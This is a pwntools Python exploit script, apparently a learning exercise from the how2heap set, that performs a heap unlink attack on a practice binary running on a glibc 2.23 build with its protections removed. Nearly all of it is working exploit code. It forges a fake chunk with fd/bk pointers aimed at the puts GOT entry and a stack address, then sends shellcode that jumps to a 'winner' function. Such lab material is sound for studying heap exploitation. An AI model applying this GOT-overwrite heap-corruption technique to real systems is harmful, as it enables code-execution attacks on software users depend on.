'''
Original Unlink: 
- Uses an altering LibC that edits the 'unlink' macro to remove the protections


Issues: 
- Altering the unlink macro to be a function for debugging is TERRIBLY annoying 
- HEAP is not? possible to make executable. So, I had to force this to jump to the stack instead. 
- CANNOT get symbols to stick :( 
	- Unsure why
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '/home/strikeout/Desktop/tools/how2heap/glibc_versions/libc-2.23-unlink.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = 'unlink'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(['/home/strikeout/Desktop/tools/how2heap/glibc_versions/ld-2.23-unlink.so',elf.path],env=env, aslr=False)
	gdb.attach(p) # 'dir /home/strikeout/Desktop/tools/how2heap/glibc_src/malloc\n') 
else: 
	p = process(elf.path, env=env) 


####################
## Important Values#
####################

winner_func = 0x400776
puts_GOT = 0x601020
heap_base = 0x155555556000
stack_loc = 0x7fffffffebf0 # Spot for shellcode :) 


#############
# Shellcode #
#############
'''
My goal was to jump to shellcode then jump to the winner function. 
However, the jmp and call instructions are RELATIVE. 
So, because RET is ABSOLUTE I used this assembly instruction

0:  68 76 07 40 00          push   0x400776
5:  c3                      ret 
'''
#shellcode = "\x90" * 8
#shellcode += "\xcc"
shellcode = "\x68\x76\x07\x40\x00\xC3"
p.sendline(shellcode) 



################
## Unlink ######
################ 

# Setup fd and bk for unlink attack :) 
fake_chunk = p64(puts_GOT - 0x18) # fd 
fake_chunk += p64(stack_loc) # bk 
fake_chunk += "A" * 0x70 # Filler prior to the chunk
fake_chunk += p64(0x90)  # Prev_size
fake_chunk += p64(0x90)  # Overwrite the size to have the prev_inuse not set

p.sendline(fake_chunk) # Corrupt chunk to perform unlinking later
p.interactive()
